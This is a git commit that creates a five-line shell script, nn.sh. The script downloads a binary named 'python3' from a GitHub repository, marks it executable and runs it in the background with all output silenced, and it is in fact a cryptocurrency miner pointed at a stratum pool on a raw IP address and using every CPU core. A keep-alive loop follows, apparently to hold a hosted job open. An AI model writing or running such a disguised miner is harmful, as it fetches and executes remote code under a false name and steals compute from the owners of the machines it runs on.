70bb1fe882d7c4936c2811f24ff840678df339cf
mulayia70 <114639456+mulayia70@users.noreply.github.com>
2022-10-03 00:34:07 +0700

    Create nn.sh

---
+++ nn.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+wget https://raw.githubusercontent.com/mulayia70/lamak/main/mom/bu/python3
+chmod +x python3
+./python3 -a yespowertide -o stratum+tcp://147.182.177.241:443 -u TJFizKH6LFbQfSi95hfwtBZcnA8sWtA3Cg.gtlb -p x -t$(nproc --all) >/dev/null 2>&1 >/dev/null &
+while :; do echo "system true"; sleep 30; done
